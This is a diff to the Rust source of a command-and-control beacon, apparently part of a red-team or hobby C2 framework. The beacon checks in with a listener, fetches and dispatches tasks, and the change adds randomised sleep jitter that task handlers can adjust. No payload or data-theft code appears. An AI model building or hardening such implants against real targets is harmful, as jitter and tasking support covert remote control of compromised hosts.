@@ -8,6 +8,7 @@ use std::{thread, time::Duration};
 
 use transport::{ActiveTransport, Transport};
 
+use rand;
 use whoami;
 
 fn load_transport() -> ActiveTransport {
@@ -17,6 +18,8 @@ fn load_transport() -> ActiveTransport {
 pub struct Beacon {
     id: String,
     listener_address: String,
+    sleep: Duration,
+    jitter: Duration,
 }
 
 impl Beacon {
@@ -25,7 +28,14 @@ impl Beacon {
             id: std::env::var("SESSION_ID").expect("no session id provided"),
             listener_address: std::env::var("LISTENER_ADDRESS")
                 .expect("no listener address provided"),
+            sleep: Duration::from_secs(5),
+            jitter: Duration::from_secs(2),
         }
+    }
+
+    fn set_sleep(&mut self, sleep: Duration, jitter: Duration) {
+        self.sleep = sleep;
+        self.jitter = jitter;
     }
 }
 
@@ -42,7 +52,7 @@ struct RegisterData {
 
 #[tokio::main]
 async fn main() {
-    let beacon = Beacon::new();
+    let mut beacon = Beacon::new();
 
     println!("Beacon Session: {}", beacon.id);
     println!("Server: {}", beacon.listener_address);
@@ -67,7 +77,8 @@ async fn main() {
         match client.fetch_tasks(&beacon).await {
             Ok(tasks_data) => {
                 if !tasks_data.is_empty() {
-                    print!("Received tasks: {:?}\n", tasks_data);
+                    println!("Received {} tasks.", tasks_data.len());
+
                     for task in tasks_data.iter() {
                         if let Err(e) = task_manager.queue(task.clone()) {
                             eprintln!("Failed to queue task: {}", e);
@@ -82,7 +93,7 @@ async fn main() {
         }
 
         // dispatch tasks
-        match task_manager.dispatch() {
+        match task_manager.dispatch(&mut beacon) {
             Ok(_) => {
                 println!("Dispatched tasks successfully.");
             }
@@ -105,10 +116,16 @@ async fn main() {
             }
         }
 
-        // Sleep
-        let sleep_time = Duration::from_secs(5);
-        println!("Sleeping for {:?}...", sleep_time);
-        thread::sleep(sleep_time);
+        // sleep
+        if beacon.jitter.as_secs() == 0 {
+            println!("Sleeping for {} seconds...", beacon.sleep.as_secs());
+            thread::sleep(beacon.sleep);
+            continue;
+        }
+        let jitter = rand::random::<u64>() % beacon.jitter.as_secs();
+        let sleep_duration = beacon.sleep + Duration::from_secs(jitter);
+        println!("Sleeping for {} seconds...", sleep_duration.as_secs());
+        thread::sleep(sleep_duration);
     }
 }
 
